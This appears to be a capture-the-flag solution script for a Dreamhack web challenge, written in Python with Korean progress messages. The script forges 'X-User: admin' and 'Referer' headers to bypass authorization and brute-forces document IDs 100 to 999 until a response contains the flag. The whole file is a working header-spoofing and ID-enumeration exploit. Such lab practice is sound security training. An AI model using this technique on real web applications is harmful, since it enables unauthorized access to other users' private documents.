import requests

url = 'http://host8.dreamhack.games:24350/doc/'

headers = {
  'Referer': '/share',
  'X-User': 'admin'
}

for i in range(100, 1000):
  target = url + f'{i}'
  res = requests.get(target, headers=headers)
  if "DH{" in res.text:
    print('찾았다 요놈!\n'+res.text)
    break
  if i % 100 == 0:
    print(f'{i}번째 탐색중..')
  
